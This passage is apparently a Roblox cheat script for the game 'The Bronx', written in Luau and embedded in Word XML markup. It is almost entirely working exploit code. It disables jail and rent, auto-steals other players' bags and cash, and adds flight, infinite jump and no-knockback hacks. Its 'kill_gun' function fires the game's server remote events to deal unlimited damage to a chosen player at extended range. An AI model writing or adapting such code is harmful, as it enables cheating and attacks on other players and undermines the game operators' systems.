    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("CameraBobbing") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.Character:FindFirstChild("CameraBobbing").Disabled = Config.TheBronx.PlayerModifications.DisableCameraBobbing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("FallDamageRagdoll") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.Character:FindFirstChild("FallDamageRagdoll").Disabled = Config.TheBronx.PlayerModifications.NoFallDamage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if LocalPlayer.PlayerGui:FindFirstChild("BloodGui") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.PlayerGui:FindFirstChild("BloodGui").Enabled = not Config.TheBronx.PlayerModifications["DisableBloodEffects"]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end           </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if LocalPlayer.PlayerGui:FindFirstChild("CameraTexts") and LocalPlayer.PlayerGui:FindFirstChild("CameraTexts"):FindFirstChild("LocalScript") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.PlayerGui:FindFirstChild("CameraTexts").Enabled = not Config.TheBronx.PlayerModifications.DisableJail</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.PlayerGui:FindFirstChild("CameraTexts").LocalScript.Disabled = Config.TheBronx.PlayerModifications.DisableJail</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if LocalPlayer.PlayerGui:FindFirstChild("RentGui") and LocalPlayer.PlayerGui:FindFirstChild("RentGui"):FindFirstChild("LocalScript") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.PlayerGui:FindFirstChild("RentGui").LocalScript.Disabled = Config.TheBronx.PlayerModifications.NoRentPay</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.TheBronx.PlayerModifications.AutoPickupBags and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in next, Workspace.Storage:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Value:IsA("MeshPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value:FindFirstChild("PlayerName") and Value:FindFirstChild("PlayerName").Value == LocalPlayer.Name then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if (Value.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude &lt; 5 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            fireproximityprompt(Value.stealprompt)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if Config.TheBronx.PlayerModifications.AutoPickupCash and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in next, Workspace.Dollas:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Value:IsA("Part") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if (Value.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude &lt; 5 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            fireproximityprompt(Value.ProximityPrompt)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       </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.CharacterAdded:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.TheBronx.PlayerModifications.DisableJail then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Lighting.Shiesty:FindFirstChildWhichIsA("RemoteEvent", true):FireServer()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UserInputService.InputBegan:Connect(LPH_NO_VIRTUALIZE(function(Input, Game_Event)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Game_Event then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Config.MiscSettings.ModifyJump.Infinity then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Input.KeyCode == Enum.KeyCode.Space then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.Health ~= 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)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DeathFrame;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.Character:FindFirstChild("Humanoid").Died:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    DeathFrame = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.Character.DescendantAdded:Connect(function(Descendant)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Descendant:IsA("BodyVelocity") or Descendant:IsA("LinearVelocity") or Descendant:IsA("VectorForce") and Config.TheBronx.PlayerModifications.NoKnockback then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(); Descendant:Destroy()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end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.CharacterAdded:Connect(LPH_NO_VIRTUALIZE(function(Character)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Character:WaitForChild("Humanoid"); Character:WaitForChild("HumanoidRootPart");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.Character.DescendantAdded:Connect(function(Descendant)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Descendant:IsA("BodyVelocity") or Descendant:IsA("LinearVelocity") or Descendant:IsA("VectorForce") and Config.TheBronx.PlayerModifications.NoKnockback then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(); Descendant:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Character:WaitForChild("Humanoid").Died:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    DeathFrame = Character:WaitForChild("HumanoidRootPart").CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.TheBronx.PlayerModifications.RespawnWhereYouDied and typeof(DeathFrame) == "CFrame" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Character:WaitForChild("HumanoidRootPart").CFrame = DeathFrame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KEYCODES = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                [Enum.KeyCode.W] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                [Enum.KeyCode.A] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                [Enum.KeyCode.S] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                [Enum.KeyCode.D] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                [Enum.KeyCode.LeftControl] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                [Enum.KeyCode.Space] = true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local root = LocalPlayer.Character:WaitForChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local humanoid = LocalPlayer.Character:WaitForChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local input_keys = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local flight_registry = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            -- Functions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local isKeysPressed = function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local keys = {...}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for i = 1, #keys do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if input_keys[keys[i]] then return 1 end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return 0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local getFlightDirection = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Vector3.new(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    isKeysPressed(Enum.KeyCode.D) - isKeysPressed(Enum.KeyCode.A),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    isKeysPressed(Enum.KeyCode.Space) - isKeysPressed(Enum.KeyCode.LeftControl),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    isKeysPressed(Enum.KeyCode.S) - isKeysPressed(Enum.KeyCode.W)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                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StartFlight = LPH_NO_VIRTUALIZE(function()                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if  Config.TheBronx.Fly then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        flight_registry,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        RunService.Stepped:Connect(function(t, dt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not root or not humanoid then return end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local velocity = getFlightDirection() * Config.TheBronx.Fly.hiz * dt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local position, orientation = CFrame.new(root.Position), CFrame.fromEulerAnglesXYZ(Camera.CFrame:ToEulerAnglesXYZ())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root.CFrame = position * orientation * CFrame.new(velocity)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root.AssemblyLinearVelocity = Vector3.zero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root.AssemblyAngularVelocity = Vector3.zero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root.Anchored = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            humanoid:ChangeState(Enum.HumanoidStateType.Freefall)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            humanoid.PlatformStand = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            humanoid:ChangeState(Enum.HumanoidStateType.Freefall)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    )</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(flight_registry, function() root.Anchored = false end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(flight_registry, function() humanoid.PlatformStand = false end)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ResetFlight = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for i,v in flight_registry do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local t = typeof(v)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if t == "RBXScriptConnection" then v:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    elseif t == "Instance" then v:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    elseif t == "function" then task.spawn(v) end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flight_registry = {}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local OnCharacter = LPH_NO_VIRTUALIZE(function(character: Model)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                root = character:WaitForChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                humanoid = character:WaitForChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.TheBronx.Fly.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RunService.Stepped:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    StartFlight()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                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local OnInputBegan = LPH_NO_VIRTUALIZE(function(input: InputObject, gameProcessedEvent: boolean)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if gameProcessedEvent then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType ~= Enum.UserInputType.Keyboard then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local keycode = input.KeyCode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if KEYCODES[keycode] then input_keys[keycode] = true end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local OnInputEnded = LPH_NO_VIRTUALIZE(function(input: InputObject)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType ~= Enum.UserInputType.Keyboard then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local keycode = input.KeyCode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if KEYCODES[keycode] then input_keys[keycode] = false end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local OnCamera = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Camera = Workspace.CurrentCamera or Camera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if LocalPlayer.Character then task.spawn(OnCharacter, LocalPlayer.Character) end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.CharacterAdded:Connect(OnCharacter)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            UserInputService.InputBegan:Connect(OnInputBegan)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            UserInputService.InputEnded:Connect(OnInputEnded)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Workspace.Changed:Connect(OnCamera)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local kill_gun = LPH_JIT_MAX(function(target: string, hpart: string, damage: number) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not hpart then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    hpart = "head"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not damage then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    damage = math.huge</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local data = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ["tool"] = Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ["target"] = Players[target],</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ["hitpos"] = Players[target].Character[hpart].Position,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not rawget(data, "tool") then</w:t>
      </w:r>
    </w:p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RequireSupport then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    require(rawget(data, "tool").Setting).Range = 10000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ReplicatedStorage.VisualizeMuzzle:FireServer(table.unpack({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    rawget(data, "tool").Handle,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        7,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Color3.new(1, 1.1098039150238, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        15,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0.02</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    rawget(data, "tool").GunScript_Local.MuzzleEffect</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ReplicatedStorage.VisualizeBullet:FireServer(table.unpack({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    rawget(data, "tool"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                rawget(data, "tool").Handle,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Vector3.new(-0.17746905982494, 0.088731124997139, 0.98011803627014),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    rawget(data, "tool").Handle.GunFirePoint,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            112139677907600,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            92977228204408,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            112139677907600,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            92977228204408</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        10,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        rawget(data, "tool").GunScript_Local.HitEffect,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        true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true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        rawget(data, "tool").GunScript_Local.BloodEffect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true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0.2,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            3696144972</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        7,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1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false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        8,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            163064102</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1.5,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        rawget(data, "tool").GunScript_Local.ExplosionEffect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false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Vector3.new(0.10000000149012, 0, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Vector3.new(-0.10000000149012, 0, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        rawget(data, "tool").GunScript_Local.TracerEffect,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        nil,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        rawget(data, "tool").GunScript_Local.ParticleEffect,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        300,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        526,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Vector3.zero,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Vector3.new(0.40000000596046, 0.40000000596046, 0.40000000596046),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Color3.new(0.63921570777893, 0.63529413938522, 0.61176472902298),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Enum.Material.Neon,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Enum.PartType.Cylinder,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        6696543809,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Vector3.new(0.0070000002160668, 0.0070000002160668, 0.0070000002160668)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true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            269514869,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            269514887,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            269514807,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
